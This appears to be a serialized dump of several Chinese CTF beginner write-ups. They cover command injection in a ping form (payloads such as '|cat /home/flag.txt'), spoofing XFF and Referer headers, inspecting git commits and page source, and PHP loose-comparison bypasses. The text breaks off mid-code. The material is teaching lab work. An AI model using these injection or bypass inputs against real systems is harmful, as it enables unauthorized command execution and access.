解题思路1：使用命令拼接找到flag相关文件\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称                题目方向   难度\nGFSJ0484   command_execution   Web    2\n\n\n# 题目10： command_execution\n\n\n# 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。\n\n\n# 考点1：Linux基础\n\n\n# 考点2： 熟悉 | 的作用（命令拼接）\n\n\n# 解题思路1：使用命令拼接找到flag相关文件\n\n> 题目描述中提到的WAF\n> \n> ‌**WAF是Web Application Firewall的缩写，即Web应用防护系统。**‌它是一种专门为Web应用提供保护的产品，通过执行一系列针对HTTP/HTTPS的安全策略来防止恶意攻击\n> \n> WAF的工作原理是通过规则匹配来执行防御动作，例如IP和URI黑白名单、DDoS防护、请求与响应过滤等功能。WAF可以部署在应用层，看到应用层的报文内容，从而实现更深入和细致的审核和过滤。\n> \n> WAF的应用场景非常广泛，适用于金融、电商、O2O、互联网+、游戏、政府、保险等行业，主要用于保护各类网站的Web应用安全。用户可以通过购买云服务或部署开源项目如ModSecurity来使用WAF。 进入靶场，我们尝试输入127.0.0.1并点击ping按钮\n\n\n\n根据题目描述的提示，这里没有写waf，并且我们根据Linux基础得知，Linux系统中，是可以同时执行两条命令的，比如分号“;”，我们拿如下命令举个例子：\n\nping -c 3 127.0.0.1 ; ls\n\n\n1\n\n\n\n\n这里我们可以看到是先执行了ping命令，后执行了ls命令。而如果我们不想执行前一句命令，只执行后一句命令，我们可以使用管道符号，也就是 “|” 。\n\nping -c 3 127.0.0.1 | ls\n\n\n1\n\n\n\n\n由此作为理论支撑，我们可以在刚才的网页尝试使用命令拼接的方式来执行我们想要的命令。\n\nping -c 3 127.0.0.1|ls\nindex.php\n\n\n1\n2\n\n\n我们此时可以直接查看根目录，甚至不需要写前面的ip地址。\n\nping -c 3 |ls /\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nrun.sh\nsbin\nsrv\nsys\ntmp\nusr\nvar\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n一般情况下，可以直接找/home目录下有没有我们的目标文件，如果没有的话，可以使用命令来查找文件。\n\nping -c 3 127.0.0.1 | find / -name "flag.txt"\n/home/flag.txt\n\n\n1\n2\n\n\n然后我们用cat命令去查看flag.txt文件的内容，即可得到flag。\n\nping -c 3 |cat /home/flag.txt\ncyberpeace{ee296471d2544681c19c1ec9bd4a24c5}\n\n\n1\n2\n\n\n> 掌握有关命令执行的知识 windows 或 linux 下:\n> \n> command1 && command2 先执行 command1，如果为真，再执行 command2\n> \n> command1 | command2 只执行 command2\n> \n> command1 & command2 先执行 command2 后执行 command1\n> \n> command1 || command2 先执行 command1，如果为假，再执行 command2',normalizedContent:'根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第10题\n\n\n\n * 题目描述：小宁写了个ping功能,但没有写waf,x老师告诉她这是非常危险的，你知道为什么吗。\n * 考点1：linux基础\n * 考点2： 熟悉 | 的作用（命令拼接）\n * 解题思路1：使用命令拼接找到flag相关文件\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称                题目方向   难度\ngfsj0484   command_execution   web    2\n\n\n# 题目10： command_execution\n\n\n# 题目描述：小宁写了个ping功能,但没有写waf,x老师告诉她这是非常危险的，你知道为什么吗。\n\n\n# 考点1：linux基础\n\n\n# 考点2： 熟悉 | 的作用（命令拼接）\n\n\n# 解题思路1：使用命令拼接找到flag相关文件\n\n> 题目描述中提到的waf\n> \n> ‌**waf是web application firewall的缩写，即web应用防护系统。**‌它是一种专门为web应用提供保护的产品，通过执行一系列针对http/https的安全策略来防止恶意攻击\n> \n> waf的工作原理是通过规则匹配来执行防御动作，例如ip和uri黑白名单、ddos防护、请求与响应过滤等功能。waf可以部署在应用层，看到应用层的报文内容，从而实现更深入和细致的审核和过滤。\n> \n> waf的应用场景非常广泛，适用于金融、电商、o2o、互联网+、游戏、政府、保险等行业，主要用于保护各类网站的web应用安全。用户可以通过购买云服务或部署开源项目如modsecurity来使用waf。 进入靶场，我们尝试输入127.0.0.1并点击ping按钮\n\n\n\n根据题目描述的提示，这里没有写waf，并且我们根据linux基础得知，linux系统中，是可以同时执行两条命令的，比如分号“;”，我们拿如下命令举个例子：\n\nping -c 3 127.0.0.1 ; ls\n\n\n1\n\n\n\n\n这里我们可以看到是先执行了ping命令，后执行了ls命令。而如果我们不想执行前一句命令，只执行后一句命令，我们可以使用管道符号，也就是 “|” 。\n\nping -c 3 127.0.0.1 | ls\n\n\n1\n\n\n\n\n由此作为理论支撑，我们可以在刚才的网页尝试使用命令拼接的方式来执行我们想要的命令。\n\nping -c 3 127.0.0.1|ls\nindex.php\n\n\n1\n2\n\n\n我们此时可以直接查看根目录，甚至不需要写前面的ip地址。\n\nping -c 3 |ls /\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nrun.sh\nsbin\nsrv\nsys\ntmp\nusr\nvar\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n一般情况下，可以直接找/home目录下有没有我们的目标文件，如果没有的话，可以使用命令来查找文件。\n\nping -c 3 127.0.0.1 | find / -name "flag.txt"\n/home/flag.txt\n\n\n1\n2\n\n\n然后我们用cat命令去查看flag.txt文件的内容，即可得到flag。\n\nping -c 3 |cat /home/flag.txt\ncyberpeace{ee296471d2544681c19c1ec9bd4a24c5}\n\n\n1\n2\n\n\n> 掌握有关命令执行的知识 windows 或 linux 下:\n> \n> command1 && command2 先执行 command1，如果为真，再执行 command2\n> \n> command1 | command2 只执行 command2\n> \n> command1 & command2 先执行 command2 后执行 command1\n> \n> command1 || command2 先执行 command1，如果为假，再执行 command2',charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"CTF攻防世界入门题单WriteUP-adworld-08",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-08",date:"2024-11-17T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-17-3-CTF-xff_referer-WriteUp.html",relativePath:"views/essay/2024-11-17-3-CTF-xff_referer-WriteUp.md",key:"v-7af0c2b4",path:"/views/essay/2024-11-17-3-CTF-xff_referer-WriteUp.html",headers:[{level:3,title:"题目描述：X老师告诉小宁其实xff和referer是可以伪造的。",slug:"题目描述-x老师告诉小宁其实xff和referer是可以伪造的。",normalizedTitle:"题目描述：x老师告诉小宁其实xff和referer是可以伪造的。",charIndex:48},{level:3,title:"考点1：HTTP协议基础",slug:"考点1-http协议基础",normalizedTitle:"考点1：http协议基础",charIndex:84},{level:3,title:"考点2： 伪造请求头",slug:"考点2-伪造请求头",normalizedTitle:"考点2： 伪造请求头",charIndex:100},{level:3,title:"解题思路1：伪造请求头，在请求头中添加xff和referer",slug:"解题思路1-伪造请求头-在请求头中添加xff和referer",normalizedTitle:"解题思路1：伪造请求头，在请求头中添加xff和referer",charIndex:114},{level:3,title:"总结：我觉得我需要装一个Hackbar，毕竟Postman返回的内容不能实时渲染为html，比较麻烦。此外，我觉得有必要记忆一下X-Forwarded-For和Referer这两个请求头名，未来如果打比赛，可能会是内网环境不允许连接外网。",slug:"总结-我觉得我需要装一个hackbar-毕竟postman返回的内容不能实时渲染为html-比较麻烦。此外-我觉得有必要记忆一下x-forwarded-for和referer这两个请求头名-未来如果打比赛-可能会是内网环境不允许连接外网。",normalizedTitle:"总结：我觉得我需要装一个hackbar，毕竟postman返回的内容不能实时渲染为html，比较麻烦。此外，我觉得有必要记忆一下x-forwarded-for和referer这两个请求头名，未来如果打比赛，可能会是内网环境不允许连接外网。",charIndex:148}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第8题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0481</td>\n<td>xff_referer</td>\n<td>Web</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：X老师告诉小宁其实xff和referer是可以伪造的。 考点1：HTTP协议基础 考点2： 伪造请求头 解题思路1：伪造请求头，在请求头中添加xff和referer 总结：我觉得我需要装一个Hackbar，毕竟Postman返回的内容不能实时渲染为html，比较麻烦。此外，我觉得有必要记忆一下X-Forwarded-For和Referer这两个请求头名，未来如果打比赛，可能会是内网环境不允许连接外网。",content:"根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第8题\n\n\n\n * 题目描述：X老师告诉小宁其实xff和referer是可以伪造的。\n * 考点1：HTTP协议基础\n * 考点2： 伪造请求头\n * 解题思路1：伪造请求头，在请求头中添加xff和referer\n * 总结：我觉得我需要装一个Hackbar，毕竟Postman返回的内容不能实时渲染为html，比较麻烦。此外，我觉得有必要记忆一下X-Forwarded-For和Referer这两个请求头名，未来如果打比赛，可能会是内网环境不允许连接外网。\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称          题目方向   难度\nGFSJ0481   xff_referer   Web    2\n\n\n# 题目8：xff_referer\n\n\n# 题目描述：X老师告诉小宁其实xff和referer是可以伪造的。\n\n\n# 考点1：HTTP协议基础\n\n\n# 考点2： 伪造请求头\n\n\n# 解题思路1：伪造请求头，在请求头中添加xff和referer\n\n首先，我们需要了解xff和referer是什么，我们可以去百度搜索，得到的结果如下\n\n> X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 Squid 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在HTTP头字段标准化草案中正式提出。 当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。 如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。XFF的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此，XFF的有效使用应该保证代理服务器是可信的，比如可以通过创建可信服务器白名单的方式。\n\n**重点：**X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。通俗易懂点就是“用来识别客户端是哪里来的”。\n\n> HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。\n\n**重点：**referer是用来告诉目标服务器该网页是从哪个页面链接过来的\n\n打开靶机地址，可以看到“ip地址必须为123.123.123.123”的提示，结合题目描述，我们可以猜到是伪造xff和referer，这时我们使用Postman或者Hackbar，向服务器发送请求。在请求头里添加X-Forwaded-For=123.123.123.123\n\n得到的结果Response显示，需要“必须来自https://www.google.com”，意思是我们必须是从google跳转来的这个页面，这时候我们添加一个referer参数，让它来自google\n\n重新发送请求，即可得到想要的flag\n\n\n# 总结：我觉得我需要装一个Hackbar，毕竟Postman返回的内容不能实时渲染为html，比较麻烦。此外，我觉得有必要记忆一下X-Forwarded-For和Referer这两个请求头名，未来如果打比赛，可能会是内网环境不允许连接外网。",normalizedContent:"根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第8题\n\n\n\n * 题目描述：x老师告诉小宁其实xff和referer是可以伪造的。\n * 考点1：http协议基础\n * 考点2： 伪造请求头\n * 解题思路1：伪造请求头，在请求头中添加xff和referer\n * 总结：我觉得我需要装一个hackbar，毕竟postman返回的内容不能实时渲染为html，比较麻烦。此外，我觉得有必要记忆一下x-forwarded-for和referer这两个请求头名，未来如果打比赛，可能会是内网环境不允许连接外网。\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称          题目方向   难度\ngfsj0481   xff_referer   web    2\n\n\n# 题目8：xff_referer\n\n\n# 题目描述：x老师告诉小宁其实xff和referer是可以伪造的。\n\n\n# 考点1：http协议基础\n\n\n# 考点2： 伪造请求头\n\n\n# 解题思路1：伪造请求头，在请求头中添加xff和referer\n\n首先，我们需要了解xff和referer是什么，我们可以去百度搜索，得到的结果如下\n\n> x-forwarded-for（xff）是用来识别通过http代理或负载均衡方式连接到web服务器的客户端最原始的ip地址的http请求头字段。 squid 缓存代理服务器的开发人员最早引入了这一http头字段，并由ietf在http头字段标准化草案中正式提出。 当今多数缓存服务器的用户为大型isp，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。 如果没有xff或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的ip地址，而非连接发起的原始ip地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始ip地址不可得，恶意访问的检测与预防的难度将大大增加。xff的有效性依赖于代理服务器提供的连接原始ip地址的真实性，因此，xff的有效使用应该保证代理服务器是可信的，比如可以通过创建可信服务器白名单的方式。\n\n**重点：**x-forwarded-for（xff）是用来识别通过http代理或负载均衡方式连接到web服务器的客户端最原始的ip地址的http请求头字段。通俗易懂点就是“用来识别客户端是哪里来的”。\n\n> http referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。\n\n**重点：**referer是用来告诉目标服务器该网页是从哪个页面链接过来的\n\n打开靶机地址，可以看到“ip地址必须为123.123.123.123”的提示，结合题目描述，我们可以猜到是伪造xff和referer，这时我们使用postman或者hackbar，向服务器发送请求。在请求头里添加x-forwaded-for=123.123.123.123\n\n得到的结果response显示，需要“必须来自https://www.google.com”，意思是我们必须是从google跳转来的这个页面，这时候我们添加一个referer参数，让它来自google\n\n重新发送请求，即可得到想要的flag\n\n\n# 总结：我觉得我需要装一个hackbar，毕竟postman返回的内容不能实时渲染为html，比较麻烦。此外，我觉得有必要记忆一下x-forwarded-for和referer这两个请求头名，未来如果打比赛，可能会是内网环境不允许连接外网。",charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3862",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3862",date:"2024-11-23T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-23-2-CTF-3862-WriteUp.html",relativePath:"views/essay/2024-11-23-2-CTF-3862-WriteUp.md",key:"v-274ae658",path:"/views/essay/2024-11-23-2-CTF-3862-WriteUp.html",headers:[{level:3,title:"题目描述：https://ProbiusOfficial.github.io差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次Flag形式 NSSCTF{}",slug:"题目描述-https-probiusofficial-github-io差点数据没脱敏就发出去了-还好还没来得及部署-重新再pull一次flag形式-nssctf",normalizedTitle:"题目描述：https://probiusofficial.github.io差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次flag形式 nssctf{}",charIndex:42},{level:3,title:"考点1：Git基础",slug:"考点1-git基础",normalizedTitle:"考点1：git基础",charIndex:131},{level:3,title:"预期解：检查Git的commit记录",slug:"预期解-检查git的commit记录",normalizedTitle:"预期解：检查git的commit记录",charIndex:144}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第13题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3862</td>\n<td>就当无事发生</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：https://ProbiusOfficial.github.io差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次Flag形式 NSSCTF{} 考点1：Git基础 预期解：检查Git的commit记录",content:"[LitCTF 2023]这套题是Web方向入门题单，这是我的第13题\n\n\n\n * 题目描述：https://ProbiusOfficial.github.io差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次Flag形式 NSSCTF{}\n * 考点1：Git基础\n * 预期解：检查Git的commit记录\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称     题目方向   难度\n3862   就当无事发生   Web    1\n\n\n# 题目12： 就当无事发生\n\n\n# 题目描述：https://ProbiusOfficial.github.io差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次Flag形式 NSSCTF{}\n\n\n# 考点1：Git基础\n\n\n# 预期解：检查Git的commit记录\n\n我们先访问题目描述中的页面，发现是一个博客，先搜集信息，查看博客中的文章，未找到Flag，同样，网页源代码和F12控制台同样没有Flag。\n\n观察这个地址，我们可以看到它是一个github.io的地址，这意味着这是Github提供的GitPages服务，我们可以在Github上找到这个仓库，根据题目描述，我们可以检查它的Commit提交记录\n\n> Github.io 是 GitHub 提供的一种非常实用的服务。它以静态网站托管为主。对于开发者和创作者而言，用户可以在 GitHub 仓库中创建一系列符合 Jekyll 等静态网站生成器规范或者纯 HTML、CSS、JavaScript 编写的网页文件。这些文件可以包括文本、图片、代码示例等各种元素。\n\n根据链接地址，Gihub的GitPages服务正常情况下都是需要用户名和链接地址是相同的，我们能合理了联想到ProbiusOfficial是个人用户名，我们访问Github上ProbiusOfficial这个用户页面https://github.com/ProbiusOfficial，找到对应的io项目[ProbiusOfficial/ProbiusOfficial.github.io: Blog\n\n\n\n页面部署是需要时间的，在短期内提交了两次，第二次会覆盖掉第一次的内容，但是第一次提交操作已经生效，所以会有Git commit记录，所以我们检查短时间内连续两次提交的情况\n\n\n\n通过检查两次commit提交的内容，我们发现第二次提交中，有我们想要的flag\n\n",normalizedContent:"[litctf 2023]这套题是web方向入门题单，这是我的第13题\n\n\n\n * 题目描述：https://probiusofficial.github.io差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次flag形式 nssctf{}\n * 考点1：git基础\n * 预期解：检查git的commit记录\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称     题目方向   难度\n3862   就当无事发生   web    1\n\n\n# 题目12： 就当无事发生\n\n\n# 题目描述：https://probiusofficial.github.io差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次flag形式 nssctf{}\n\n\n# 考点1：git基础\n\n\n# 预期解：检查git的commit记录\n\n我们先访问题目描述中的页面，发现是一个博客，先搜集信息，查看博客中的文章，未找到flag，同样，网页源代码和f12控制台同样没有flag。\n\n观察这个地址，我们可以看到它是一个github.io的地址，这意味着这是github提供的gitpages服务，我们可以在github上找到这个仓库，根据题目描述，我们可以检查它的commit提交记录\n\n> github.io 是 github 提供的一种非常实用的服务。它以静态网站托管为主。对于开发者和创作者而言，用户可以在 github 仓库中创建一系列符合 jekyll 等静态网站生成器规范或者纯 html、css、javascript 编写的网页文件。这些文件可以包括文本、图片、代码示例等各种元素。\n\n根据链接地址，gihub的gitpages服务正常情况下都是需要用户名和链接地址是相同的，我们能合理了联想到probiusofficial是个人用户名，我们访问github上probiusofficial这个用户页面https://github.com/probiusofficial，找到对应的io项目[probiusofficial/probiusofficial.github.io: blog\n\n\n\n页面部署是需要时间的，在短期内提交了两次，第二次会覆盖掉第一次的内容，但是第一次提交操作已经生效，所以会有git commit记录，所以我们检查短时间内连续两次提交的情况\n\n\n\n通过检查两次commit提交的内容，我们发现第二次提交中，有我们想要的flag\n\n",charsets:{cjk:!0},lastUpdated:"2024/11/25, 21:24:57",lastUpdatedTimestamp:1732541097e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3861",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3861",date:"2024-11-23T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-23-1-CTF-3861-WriteUp.html",relativePath:"views/essay/2024-11-23-1-CTF-3861-WriteUp.md",key:"v-132760d4",path:"/views/essay/2024-11-23-1-CTF-3861-WriteUp.html",headers:[{level:3,title:"题目描述：奇怪，放哪里了，怎么看不见呢？（初级难度）",slug:"题目描述-奇怪-放哪里了-怎么看不见呢-初级难度",normalizedTitle:"题目描述：奇怪，放哪里了，怎么看不见呢？（初级难度）",charIndex:42},{level:3,title:"考点1：元素审查",slug:"考点1-元素审查",normalizedTitle:"考点1：元素审查",charIndex:72},{level:3,title:"预期解：检查源代码，元素审查",slug:"预期解-检查源代码-元素审查",normalizedTitle:"预期解：检查源代码，元素审查",charIndex:84},{level:3,title:"彩蛋：",slug:"彩蛋",normalizedTitle:"彩蛋：",charIndex:102}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第12题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3861</td>\n<td>我Flag呢</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：奇怪，放哪里了，怎么看不见呢？（初级难度） 考点1：元素审查 预期解：检查源代码，元素审查 彩蛋：",content:'[LitCTF 2023]这套题是Web方向入门题单，这是我的第12题\n\n\n\n * 题目描述：奇怪，放哪里了，怎么看不见呢？（初级难度）\n * 考点1：元素审查\n * 预期解：检查源代码，元素审查\n * 彩蛋：\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称     题目方向   难度\n3861   我Flag呢   Web    1\n\n\n# 题目12： 我Flag呢\n\n\n# 题目描述：奇怪，放哪里了，怎么看不见呢？（初级难度）\n\n\n# 考点1：元素审查\n\n\n# 预期解：检查源代码，元素审查\n\n方法列举\n方法一：使用快捷键 Ctrl+U查看网页源代码\n方法二：在网页URL地址前加 "view-source:"\n方法三：使用F12快捷键，切换到Element页查看网页源代码\n方法四：鼠标右键，选择“查看网页源代码”\n\n\n# 彩蛋：\n\n\n\n在F12控制台，如图可以看到提示，我们输入giveMeEgg()\n\n> 控制台Console会输出页面资源报错信息，也会输出一些指定的输出信息，比如console.log("Hello World")，或者是js调试信息\n> \n> 此外，也可以输入一些简单的JavaScript脚本',normalizedContent:'[litctf 2023]这套题是web方向入门题单，这是我的第12题\n\n\n\n * 题目描述：奇怪，放哪里了，怎么看不见呢？（初级难度）\n * 考点1：元素审查\n * 预期解：检查源代码，元素审查\n * 彩蛋：\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称     题目方向   难度\n3861   我flag呢   web    1\n\n\n# 题目12： 我flag呢\n\n\n# 题目描述：奇怪，放哪里了，怎么看不见呢？（初级难度）\n\n\n# 考点1：元素审查\n\n\n# 预期解：检查源代码，元素审查\n\n方法列举\n方法一：使用快捷键 ctrl+u查看网页源代码\n方法二：在网页url地址前加 "view-source:"\n方法三：使用f12快捷键，切换到element页查看网页源代码\n方法四：鼠标右键，选择“查看网页源代码”\n\n\n# 彩蛋：\n\n\n\n在f12控制台，如图可以看到提示，我们输入givemeegg()\n\n> 控制台console会输出页面资源报错信息，也会输出一些指定的输出信息，比如console.log("hello world")，或者是js调试信息\n> \n> 此外，也可以输入一些简单的javascript脚本',charsets:{cjk:!0},lastUpdated:"2024/11/25, 21:24:57",lastUpdatedTimestamp:1732541097e3},{title:"CTF攻防世界入门题单WriteUP-adworld-11",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-11",date:"2024-11-20T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-20-1-CTF-simple_php-WriteUp.html",relativePath:"views/essay/2024-11-20-1-CTF-simple_php-WriteUp.md",key:"v-784ed714",path:"/views/essay/2024-11-20-1-CTF-simple_php-WriteUp.html",headers:[{level:3,title:"题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。",slug:"题目描述-小宁听说php是最好的语言-于是她简单学习之后写了几行php代码。",normalizedTitle:"题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。",charIndex:49},{level:3,title:"考点1：php基础",slug:"考点1-php基础",normalizedTitle:"考点1：php基础",charIndex:91},{level:3,title:"思路1：",slug:"思路1",normalizedTitle:"思路1：",charIndex:104}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第11题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0485</td>\n<td>simple_php</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 考点1：php基础 思路1：",content:"根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第11题\n\n\n\n * 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n * 考点1：php基础\n * 思路1：\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称         题目方向   难度\nGFSJ0485   simple_php   Web    1\n\n\n# 题目11： simple_php\n\n\n# 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n\n\n# 考点1：php基础\n\n\n# 思路1：\n\n\ufeff<?php\n# 这里这行代码是显示源代码的意思，一般的php的普通渲染是不会显示出来的\nshow_source(__FILE__);\n# config.pip文件应该是配置项之类的\ninclude(\"config.php\");\n# 定义两个变量，需要我们在请求的时候传入a和b\n$a=@$_GET['a'];\n$b=@$_GET['b'];\n# if判断，如果a弱等于0，并且a不能为0的话，就输出flag1\nif($a==0 and $a){\n    echo $flag1;\n}\n# if判断，b不能为数字，如果为数字就退出\nif(is_numeric($b)){\n    exit();\n}\n# if判断，b必须大于1234\nif($b>1234){\n    echo $flag2;\n}\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n在传入一个参数a的时候，对照PHP 类型比较表 - Manual，如果PHP的版本低于8.0.0，只要a传入一个字符串，就能符合条件。而下一个判断是判断b是否是一个数字，我们可以传入一个字符串，用数字拼接字符串的方式，就能符合不是数字的条件，进入下一个判断。第三个判断是比较b和1234，我们只要输入一个比1234大的数字拼接一个字符串，即可符合条件\n\n\n\n我们直接在地址栏输入地址加参数a=a，即可得到flag1，也就是flag的前部部分，输入b=1235a，即可得到flag\n\nhttp://61.147.171.105:59590/?a=a&b=1235a\n\n<?php\nshow_source(__FILE__);\ninclude(\"config.php\");\n# 将我们输入的字符串a传给了$a，在进行弱比较时，是false*，并且传入了a，a所以不是0，符合条件\n$a=@$_GET['a'];\n$b=@$_GET['b'];\nif($a==0 and $a){\n    echo $flag1;\n}\n# 如果我们输入数字12345，这里会直接退出\nif(is_numeric($b)){\n    exit();\n}\n/* \n这里是一个松散比较，我们传入一个字符串123a，就能绕过上个判断，来到这里的判断，所以我们传入1235a\n传入1235a后，会比较1235和1234，与a没有关系\n*/\nif($b>1234){\n    